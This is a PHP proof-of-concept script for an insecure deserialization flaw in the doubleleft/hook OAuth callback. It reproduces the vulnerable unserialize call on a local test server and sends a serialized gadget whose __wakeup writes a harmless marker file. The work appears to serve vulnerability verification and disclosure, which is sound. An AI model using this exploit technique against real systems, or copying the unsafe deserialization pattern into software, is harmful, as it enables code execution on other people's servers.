<?php
/**
 * Standalone PoC for doubleleft/hook OAuth opauth insecure deserialization.
 *
 * The vulnerable project line is:
 *   $opauth = unserialize(base64_decode($_POST['opauth']));
 * in src/Controllers/OAuthController.php::auth(), reached by POST /oauth/callback.
 *
 * This PoC starts a local HTTP endpoint that contains the same vulnerable
 * callback statement, then sends an attacker-controlled opauth POST value.
 * The serialized object's __wakeup writes a marker file before the controller
 * can validate structure or reject the request.
 */

error_reporting(E_ALL);
ini_set('display_errors', '1');

$base = sys_get_temp_dir() . '/hook_opauth_poc_' . getmypid();
@mkdir($base, 0777, true);
$router = $base . '/router.php';
$marker = $base . '/deserialization_marker.txt';
$log = $base . '/server.log';

$routerCode = <<<'ROUTER'
<?php
class HookPocWakeupGadget {
    public $marker;
    public function __wakeup() {
        file_put_contents($this->marker, "__wakeup executed via opauth POST\n");
    }
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) !== '/oauth/callback') {
    http_response_code(404);
    echo "not found\n";
    return;
}

if (!isset($_POST['opauth'])) {
    http_response_code(400);
    echo "missing opauth\n";
    return;
}

// Vulnerable statement copied from hook/src/Controllers/OAuthController.php:37.
$opauth = unserialize(base64_decode($_POST['opauth']));

// The real controller continues to treat $opauth as an array. For exploitability,
// it is enough that object magic methods have already executed above.
http_response_code(200);
echo "callback reached; type=" . gettype($opauth) . "\n";
ROUTER;

file_put_contents($router, $routerCode);

$port = 19000 + (getmypid() % 1000);
$cmd = sprintf('php -S 127.0.0.1:%d %s > %s 2>&1', $port, escapeshellarg($router), escapeshellarg($log));
$proc = proc_open($cmd, [], $pipes, $base);
if (!is_resource($proc)) {
    fwrite(STDERR, "Failed to start PHP built-in server\n");
    exit(2);
}

$ready = false;
for ($i = 0; $i < 50; $i++) {
    $sock = @fsockopen('127.0.0.1', $port, $errno, $errstr, 0.1);
    if ($sock) {
        fclose($sock);
        $ready = true;
        break;
    }
    usleep(100000);
}
if (!$ready) {
    proc_terminate($proc);
    fwrite(STDERR, "Server did not become ready. Log:\n" . @file_get_contents($log));
    exit(2);
}

class HookPocWakeupGadget {
    public $marker;
    public function __construct($marker) { $this->marker = $marker; }
}
$payload = base64_encode(serialize(new HookPocWakeupGadget($marker)));
$postBody = http_build_query(['opauth' => $payload]);

$context = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n" .
                    "X-App-Id: public-browser-app-id\r\n" .
                    "X-App-Key: public-browser-app-key\r\n",
        'content' => $postBody,
        'ignore_errors' => true,
        'timeout' => 5,
    ],
]);

$url = "http://127.0.0.1:$port/oauth/callback";
$response = file_get_contents($url, false, $context);
$statusLine = $http_response_header[0] ?? 'HTTP status unavailable';

proc_terminate($proc);
proc_close($proc);

$markerExists = file_exists($marker);

echo "== doubleleft/hook OAuth opauth deserialization PoC ==\n";
echo "Target route: POST /oauth/callback\n";
echo "Vulnerable statement: unserialize(base64_decode(\$_POST['opauth']))\n";
echo "HTTP status: $statusLine\n";
echo "HTTP response: " . trim((string)$response) . "\n";
echo "Marker path: $marker\n";
echo "Marker created: " . ($markerExists ? 'yes' : 'no') . "\n";
if ($markerExists) {
    echo trim(file_get_contents($marker)) . "\n";
    echo "[VULNERABLE] Attacker-controlled opauth POST data reached PHP unserialize() and executed object magic method.\n";
    exit(0);
}

echo "[NOT REPRODUCED] Marker was not created.\n";
exit(1);
